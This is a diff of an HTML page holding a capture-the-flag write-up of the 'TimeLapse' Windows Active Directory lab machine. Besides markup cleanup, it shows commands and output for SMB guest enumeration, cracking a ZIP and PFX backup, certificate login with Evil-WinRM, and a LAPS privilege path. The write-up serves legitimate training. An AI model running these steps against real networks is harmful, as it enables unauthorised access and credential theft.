@@ -501,7 +501,7 @@
 
 
 <p><img alt="timelapse" src="https://github.com/user-attachments/assets/6feecea6-e895-400b-b024-237619d7060b" /></p>
-<h1 id="timelapse-writeup">TimeLapse-WriteUp<a class="headerlink" href="#timelapse-writeup" title="Permanent link">&para;</a></h1>
+<h1 id="timelapse-writeup">TimeLapse-WriteUp</h1>
 <p>In this Windows Active Directory machine, we’ll perform a full domain compromise starting from a guest SMB share, extracting sensitive backups, and leveraging certificate-based authentication to pivot into privileged access. You will learn how to:</p>
 <ul>
 <li>Enumerate SMB shares as guest</li>
@@ -547,7 +547,7 @@ We used the following <code>nmap</code> command to detect all open TCP ports on 
 <a id="__codelineno-0-29" name="__codelineno-0-29" href="#__codelineno-0-29"></a>Nmap<span class="w"> </span><span class="k">done</span>:<span class="w"> </span><span class="m">1</span><span class="w"> </span>IP<span class="w"> </span>address<span class="w"> </span><span class="o">(</span><span class="m">1</span><span class="w"> </span>host<span class="w"> </span>up<span class="o">)</span><span class="w"> </span>scanned<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m">501</span>.03<span class="w"> </span>seconds
 <a id="__codelineno-0-30" name="__codelineno-0-30" href="#__codelineno-0-30"></a><span class="w">           </span>Raw<span class="w"> </span>packets<span class="w"> </span>sent:<span class="w"> </span><span class="m">196896</span><span class="w"> </span><span class="o">(</span><span class="m">8</span>.663MB<span class="o">)</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>Rcvd:<span class="w"> </span><span class="m">345</span><span class="w"> </span><span class="o">(</span><span class="m">15</span>.180KB<span class="o">)</span>
 </code></pre></div>
-<h3 id="service-enumeration">Service Enumeration:<a class="headerlink" href="#service-enumeration" title="Permanent link">&para;</a></h3>
+<h3 id="service-enumeration">Service Enumeration:</h3>
 <p>After identifying open ports, we performed a targeted <code>nmap</code> scan on them using version detection and default scripts.
 We used <code>-sVC</code> to gather service versions and run default scripts. This helps identify running services (like Kerberos, LDAP, SMB, WinRM) and extract useful metadata from them.</p>
 <div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>sudo<span class="w"> </span>nmap<span class="w"> </span>-sVC<span class="w"> </span>-p53,88,135,139,389,445,464,593,636,3268,3269,5986,9389,49667,49673,49674,49695<span class="w"> </span><span class="m">10</span>.10.11.152
@@ -595,7 +595,7 @@ We used <code>-sVC</code> to gather service versions and run default scripts. Th
 <a id="__codelineno-1-43" name="__codelineno-1-43" href="#__codelineno-1-43"></a>Service<span class="w"> </span>detection<span class="w"> </span>performed.<span class="w"> </span>Please<span class="w"> </span>report<span class="w"> </span>any<span class="w"> </span>incorrect<span class="w"> </span>results<span class="w"> </span>at<span class="w"> </span>https://nmap.org/submit/<span class="w"> </span>.
 <a id="__codelineno-1-44" name="__codelineno-1-44" href="#__codelineno-1-44"></a>Nmap<span class="w"> </span><span class="k">done</span>:<span class="w"> </span><span class="m">1</span><span class="w"> </span>IP<span class="w"> </span>address<span class="w"> </span><span class="o">(</span><span class="m">1</span><span class="w"> </span>host<span class="w"> </span>up<span class="o">)</span><span class="w"> </span>scanned<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m">128</span>.16<span class="w"> </span>seconds
 </code></pre></div>
-<h3 id="smb-enumeration-with-netexec">SMB Enumeration with NetExec:<a class="headerlink" href="#smb-enumeration-with-netexec" title="Permanent link">&para;</a></h3>
+<h3 id="smb-enumeration-with-netexec">SMB Enumeration with NetExec:</h3>
 <p>We used NetExec (formerly CrackMapExec) to test if anonymous (null) authentication is allowed on the SMB service. This helps determine if we can access shares or perform further enumeration without credentials.
 We use a dummy username (a) with an empty password to test for guest or null session access. The result shows we're allowed in as Guest, meaning we can explore some shares.
 <div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.10.11.152<span class="w"> </span>-u<span class="w"> </span><span class="s1">'a'</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">''</span>
@@ -617,7 +617,7 @@ We want to see which shared folders we can access. In this case, we find a reada
 <a id="__codelineno-3-11" name="__codelineno-3-11" href="#__codelineno-3-11"></a>SMB<span class="w">         </span><span class="m">10</span>.10.11.152<span class="w">    </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span>Shares<span class="w">          </span>READ
 <a id="__codelineno-3-12" name="__codelineno-3-12" href="#__codelineno-3-12"></a>SMB<span class="w">         </span><span class="m">10</span>.10.11.152<span class="w">    </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span>SYSVOL<span class="w">                          </span>Logon<span class="w"> </span>server<span class="w"> </span>share
 </code></pre></div></p>
-<h3 id="accessing-the-shared-folder-and-downloading-a-backup">Accessing the Shared Folder and Downloading a Backup<a class="headerlink" href="#accessing-the-shared-folder-and-downloading-a-backup" title="Permanent link">&para;</a></h3>
+<h3 id="accessing-the-shared-folder-and-downloading-a-backup">Accessing the Shared Folder and Downloading a Backup</h3>
 <p>Once we confirmed Guest access, we connected to the <code>Shares</code> shared folder using <code>smbclient</code>.
 <code>smbclient</code> allows us to interact with SMB shares similarly to using an FTP client. We connect anonymously (<code>-N</code>) and list directories.
 <div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>smbclient<span class="w"> </span>//10.10.11.152/Shares<span class="w"> </span>-U<span class="w"> </span><span class="s1">'a'</span><span class="w"> </span>-I<span class="w"> </span><span class="m">10</span>.10.11.152<span class="w"> </span>-N
@@ -637,7 +637,7 @@ We downloaded it.
 <a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a>smb:<span class="w"> </span><span class="se">\D</span>ev<span class="se">\&gt;</span><span class="w"> </span>get<span class="w"> </span>winrm_backup.zip
 <a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a>getting<span class="w"> </span>file<span class="w"> </span><span class="se">\D</span>ev<span class="se">\w</span>inrm_backup.zip<span class="w"> </span>of<span class="w"> </span>size<span class="w"> </span><span class="m">2611</span><span class="w"> </span>as<span class="w"> </span>winrm_backup.zip<span class="w"> </span><span class="o">(</span><span class="m">2</span>.6<span class="w"> </span>KiloBytes/sec<span class="o">)</span><span class="w"> </span><span class="o">(</span>average<span class="w"> </span><span class="m">2</span>.6<span class="w"> </span>KiloBytes/sec<span class="o">)</span>
 </code></pre></div></p>
-<h3 id="cracking-zip-and-pfx-credentials">Cracking ZIP and PFX Credentials:<a class="headerlink" href="#cracking-zip-and-pfx-credentials" title="Permanent link">&para;</a></h3>
+<h3 id="cracking-zip-and-pfx-credentials">Cracking ZIP and PFX Credentials:</h3>
 <p>After downloading the file <code>winrm_backup.zip</code>, we suspected it might be password-protected. To confirm this and extract the hash, we used <code>zip2john</code>, which converts encrypted ZIP archives into a format that John the Ripper can crack.
 <div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>zip2john<span class="w"> </span>winrm_backup.zip<span class="w"> </span>&gt;<span class="w"> </span>backup.hash
 <a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>ver<span class="w"> </span><span class="m">2</span>.0<span class="w"> </span>efh<span class="w"> </span><span class="m">5455</span><span class="w"> </span>efh<span class="w"> </span><span class="m">7875</span><span class="w"> </span>winrm_backup.zip/legacyy_dev_auth.pfx<span class="w"> </span>PKZIP<span class="w"> </span>Encr:<span class="w"> </span>2b<span class="w"> </span>chk,<span class="w"> </span>TS_chk,<span class="w"> </span><span class="nv">cmplen</span><span class="o">=</span><span class="m">2405</span>,<span class="w"> </span><span class="nv">decmplen</span><span class="o">=</span><span class="m">2555</span>,<span class="w"> </span><span class="nv">crc</span><span class="o">=</span>12EC5683
@@ -688,7 +688,7 @@ We used it to extract the file:
 <a id="__codelineno-11-13" name="__codelineno-11-13" href="#__codelineno-11-13"></a>Session<span class="w"> </span>completed
 </code></pre></div></p>
 <p>The password was successfully cracked: <code>thuglegacy</code></p>
-<h3 id="authenticating-with-evil-winrm-using-certificate-private-key">Authenticating with Evil-WinRM using Certificate &amp; Private Key<a class="headerlink" href="#authenticating-with-evil-winrm-using-certificate-private-key" title="Permanent link">&para;</a></h3>
+<h3 id="authenticating-with-evil-winrm-using-certificate-private-key">Authenticating with Evil-WinRM using Certificate &amp; Private Key</h3>
 <p>After extracting the <code>.pfx</code> file (<code>legacyy_dev_auth.pfx</code>) from the <code>winrm_backup.zip</code>, we suspected it might contain authentication material—either for email, encryption, or remote access. In the context of Active Directory environments, <code>.pfx</code> files often store <strong>X.509 certificates and private keys</strong>, which can be used for <strong>certificate-based authentication</strong>, including over <strong>WinRM</strong>.</p>
 <p><strong>Why extract the certificate and private key?</strong></p>
 <p>Because WinRM (Windows Remote Management) supports authentication using certificates instead of usernames and passwords.
@@ -819,7 +819,7 @@ We confirmed access by reading the user flag:
 <a id="__codelineno-17-13" name="__codelineno-17-13" href="#__codelineno-17-13"></a><span class="p">*</span><span class="n">Evil-WinRM</span><span class="p">*</span> <span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">legacyy</span><span class="p">\</span><span class="n">Desktop</span><span class="p">&gt;</span> <span class="nb">type </span><span class="n">user</span><span class="p">.</span><span class="n">txt</span>
 <a id="__codelineno-17-14" name="__codelineno-17-14" href="#__codelineno-17-14"></a><span class="n">801aa6ed3f58b6cfc291c9592831c71b</span>
 </code></pre></div></p>
-<h3 id="post-exploitation">Post-Exploitation<a class="headerlink" href="#post-exploitation" title="Permanent link">&para;</a></h3>
+<h3 id="post-exploitation">Post-Exploitation</h3>
 <p>After gaining access as <code>legacyy</code>, we proceeded with <strong>post-exploitation enumeration</strong> to identify potential privilege escalation paths. A common first step in this phase is to run <strong>automated enumeration tools</strong> like <strong>winPEAS</strong>.
 <strong>Why upload and run winPEAS?</strong>
 <code>winPEAS</code> automates the discovery of misconfigurations, stored credentials, vulnerable services, and privilege escalation vectors on Windows systems. It's particularly useful for quickly identifying low-hanging fruit that might be missed during manual enumeration.</p>
@@ -979,9 +979,9 @@ Without <code>-S</code>, <code>evil-winrm</code> attempts a connection over HTTP
 <a id="__codelineno-23-43" name="__codelineno-23-43" href="#__codelineno-23-43"></a>Kerberos support for Dynamic Access Control on this device has been disabled.
 </code></pre></div></p>
 <p>Among the groups, we found something interesting <code>TIMELAPSE\LAPS_Readers</code></p>
-<h4 id="what-is-laps_readers">What is <code>LAPS_Readers</code>?<a class="headerlink" href="#what-is-laps_readers" title="Permanent link">&para;</a></h4>
+<h4 id="what-is-laps_readers">What is <code>LAPS_Readers</code>?</h4>
 <p><code>LAPS_Readers</code> is a <strong>custom Active Directory group</strong> that has <strong>read access to LAPS-managed passwords</strong>.</p>
-<h5 id="what-is-laps">What is LAPS?<a class="headerlink" href="#what-is-laps" title="Permanent link">&para;</a></h5>
+<h5 id="what-is-laps">What is LAPS?</h5>
 <p><strong>LAPS (Local Administrator Password Solution)</strong> is a Microsoft feature that:</p>
 <ul>
 <li>Randomly generates a <strong>unique local administrator password</strong> for each computer.</li>
@@ -1150,6 +1150,8 @@ Rooted!</p>
     
     
       <script src="../../../../../../assets/javascripts/bundle.f55a23d4.min.js"></script>
+      
+        <script src="../../../../../../javascripts/site.js"></script>
       
     
   </body>
